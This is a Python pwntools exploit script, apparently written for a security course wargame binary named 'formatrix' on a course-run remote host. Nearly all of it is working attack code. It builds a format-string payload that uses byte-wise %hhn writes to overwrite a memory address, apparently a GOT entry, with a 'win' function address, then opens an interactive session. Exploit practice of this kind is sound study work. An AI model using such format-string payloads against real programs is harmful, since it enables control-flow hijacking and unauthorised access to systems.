#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './formatrix' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 13742 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p.recvuntil(b'You say: ', drop=True)

# Win function at    0x08048536
# printf function at 0x080483b0
#                    0x8049c18
# sprintf            0x08048400
# fgets              0x080483c0
target = 0x8049c18
payload = p32(target)
payload += p32(target + 1)
payload += p32(target + 2)
payload += p32(target + 3)

write_36 = 0x36 - len(payload)
payload += f'%{write_36}x%3$hhn'.encode()

write_85 = 0x100 + 0x85 - 0x36
payload += f'%{write_85}x%4$hhn'.encode()

write_04 = 0x100 + 0x04 - 0x85
payload += f'%{write_04}x%5$hhn'.encode()

write_08 = 0x100 + 0x08 - 0x04
payload += f'%{write_08}x%6$hhn'.encode()

p.sendline(payload)

p.interactive()

